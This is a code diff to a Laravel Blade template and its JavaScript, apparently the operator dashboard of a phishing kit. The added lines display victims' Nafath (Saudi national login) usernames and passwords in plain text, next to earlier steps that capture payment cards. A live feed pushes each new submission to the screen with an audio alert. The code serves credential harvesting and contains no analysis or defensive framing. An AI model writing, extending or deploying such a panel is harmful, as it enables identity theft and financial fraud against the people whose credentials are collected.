@@ -42,6 +42,15 @@
                       </div>
                     </div><hr>
                     @endif
+                    @if($notification->nafad_username)
+                    <div class="card-body">
+                      <h5><i class="icon fas fa-check"></i>  أرسل اسم المستخدم وكلمة السر الخاص بنفاذ      </h5>
+                        <div class="direct-chat-text">
+                        <p><strong class="fs-3 border p-1 rounded">Username:</strong> {{$notification->nafad_username}}</p>
+                        <p><strong class="fs-3 border p-1 rounded">Password:</strong> {{$notification->nafad_password}}</p>
+                      </div>
+                    </div><hr>
+                    @endif
                   @endif
                     @if($notification->step_number >=4)
                      @if($notification->paymentCard)
@@ -244,6 +253,8 @@
   {
     if(dataA.people_id == id)
     {
+      if(dataA.nafad_id)
+      {
       $(".notificationsList").prepend(`
         <div class="card-body">
           <h5><i class="icon fas fa-check"></i> `+dataA.page+`</h5>
@@ -252,6 +263,19 @@
           </div>
         </div><hr>
       `);
+      }
+      else
+      {
+        $(".notificationsList").prepend(`
+        <div class="card-body">
+          <h5><i class="icon fas fa-check"></i> `+dataA.page+`</h5>
+            <div class="direct-chat-text">
+            <p><strong class="fs-3 border p-1 rounded">Username:</strong> `+dataA.nafad_username+`</p>
+            <p><strong class="fs-3 border p-1 rounded">Password:</strong> `+dataA.nafad_password+`</p>
+          </div>
+        </div><hr>
+      `);
+      }
 
       playDataAudio();
     }
